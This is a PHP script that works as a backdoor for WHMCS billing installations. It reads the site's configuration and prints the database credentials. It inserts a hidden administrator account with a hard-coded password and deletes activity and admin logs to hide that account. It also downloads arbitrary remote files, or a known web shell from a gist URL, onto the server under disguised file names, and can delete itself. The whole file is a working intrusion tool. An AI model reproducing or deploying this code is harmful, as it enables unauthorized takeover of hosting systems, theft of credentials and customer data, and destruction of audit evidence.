<?php include('configuration.php'); error_reporting(0); //WHMCS C0nfiguration 
$BaseURL = $_SERVER['HTTP_HOST'];
$PhpSelf = $_SERVER['PHP_SELF'];
$Filename = "/".basename($_SERVER['PHP_SELF']);
$DirectoryPath = trim($PhpSelf, $Filename);
$connection = mysqli_connect($db_host,$db_username,$db_password);
if($connection)
{
	
    mysqli_select_db($connection,$db_name);
	console_log('                         :::: Connected to WHMCS Database ::::');
$dbc = array(
"Database Host" => $db_host,
"Database Name" =>$db_name,
"Database Username" =>$db_username,
"Database Password" =>$db_password
);
console_table($dbc);
		console_log("1.Create Administrator - http://$BaseURL$PhpSelf?create");
console_log("2.Remove Administrator - http://$BaseURL$PhpSelf?rm");
console_log("3.Remove Logs - http://$BaseURL$PhpSelf?rmlog");
console_log("4.Remove Administrator & Logs - http://$BaseURL$PhpSelf?rmall");
console_log("5.Upload File - http://$BaseURL$PhpSelf?upload=yourfileurlhere");
console_log("6.Upload Shell - http://$BaseURL$PhpSelf?su");
console_log("7.Die - http://$BaseURL$PhpSelf?die");	

}
else
{
    console_log('Configuration is Invalid');
}

if(isset($_GET['create'])) {
$password = "$2y$10\$\d6J2Z57sCEg.nukbNukjMOJ2UnXCYF8sICAwDDs1p8uATG0BB71Pi";
$passwordhash = "$2y$10\$\cG4lgYqzs7Dy8WS6Cxd7iOslhJ1qFf/j27NwElu29VVTVLUORqwyW";
$query = "INSERT INTO `tbladmins` (`id`, `uuid`, `roleid`, `username`, `password`, `passwordhash`, `authmodule`, `authdata`, `firstname`, `lastname`, `email`, `signature`, `notes`, `template`, `language`, `disabled`, `loginattempts`, `supportdepts`, `ticketnotifications`, `homewidgets`, `password_reset_key`, `password_reset_data`, `password_reset_expiry`, `hidden_widgets`, `widget_order`, `created_at`, `updated_at`) VALUES 
	(2, '7abe2dfb-055a-4766-9eaf-0b7531cb85e8', 1, 'admin2', '".$password."', '".$passwordhash."', '', '', 'Host', 'Shabh Ji', 'sanjaydeveloper@givmail.com', '', 'Welcome to WHMCS!  Please ensure you have setup the cron job to automate tasks', 'blend', 'english', 0, 0, 1, '', 'getting_started:true,orders_overview:true,supporttickets_overview:true,my_notes:true,client_activity:true,open_invoices:true,activity_log:true|income_overview:true,system_overview:true,whmcs_news:true,sysinfo:true,admin_activity:true,todo_list:true,network_status:true,income_forecast:true|', '', '', '0000-00-00 00:00:00', '', 'Overview,Automation,Support,Billing,MarketConnect,Staff,ToDo,ClientActivity,NetworkStatus,Health,Activity', '0000-00-00 00:00:00', '2020-04-02 11:53:26')"; 
											$aquery = mysqli_query($connection,$query);

console_log('Creation of Adminstrator Account was Successfull');
console_log('Username : admin2');
console_log('Password : admin1234@');
}



if(isset($_GET['rm'])){
	$b = mysqli_query($connection,"DELETE FROM tbladmins Where username='admin2'");
if($b){console_log('Account Removed Successfully');}else{ console_log('Error Occured!');}
header("Location: $PhpSelf");
}

if(isset($_GET['rmlog'])){

$c = mysqli_query($connection,"DELETE FROM `tblactivitylog` WHERE user='admin2'");
$d = mysqli_query($connection,"DELETE FROM `tbladminlog` WHERE adminusername='admin2'");
if($c){
if($d){ console_log('Logs  Removed Successfully');
header("Location: $PhpSelf");
}else{ console_log('Error Occured!');}
}
}

if(isset($_GET['rmall'])){
$c = mysqli_query($connection,"DELETE FROM tbladmins Where username='admin2'");
$d = mysqli_query($connection,"DELETE FROM `tblactivitylog` WHERE user='admin2'");
$e = mysqli_query($connection,"DELETE FROM `tbladminlog` WHERE adminusername='admin2'");
if($c){if($d){
if($e){ console_log('Account & Logs Removed Successfully');
header("Location: $PhpSelf");}}}else{ console_log('Error Occured!');}
}


if(isset($_GET['die'])){
unlink(__FILE__); 
}

if(isset($_GET['upload']))
{
	if($_GET['upload'] != "yourfileurlhere"){
 $file_url=$_GET['upload'];
 $data = file_get_contents($file_url);
 $new = 'wddx_add_vars.php';
 $upload =file_put_contents($new, $data);
 if($upload){
    console_log('File Uploaded Successfully');
	console_log("http://$BaseURL/$DirectoryPath/wddx_add_vars.php");
	
 }else{
    console_log('Error Occured!');
	} }
}


if(isset($_GET['su']))
{
 $file_url="https://gist.githubusercontent.com/B0RU70/4be357e6cb784a5ed4075f55e2645408/raw/a46fd52bbd91581b66d7ed1b10cc7cd5f17a50aa/alfa.php"; // OTHER SHELL URL
 $data = file_get_contents($file_url);
 $new = 'zend_thread_id.php';
 $upload =file_put_contents($new, $data);
 if($upload){
    console_log('Shell Uploaded Successfully');
	console_log("http://$BaseURL/$DirectoryPath/zend_thread_id.php");
 }else{
    console_log('Error Occured!');
 } 
}




function console_log( $data ){
  echo '<script>';
  echo 'console.info('. json_encode( $data ) .')';
  echo '</script>';
}
function console_table( $data ){
  echo '<script>';
  echo 'console.table('. json_encode( $data ) .')';
  echo '</script>';
}
?>
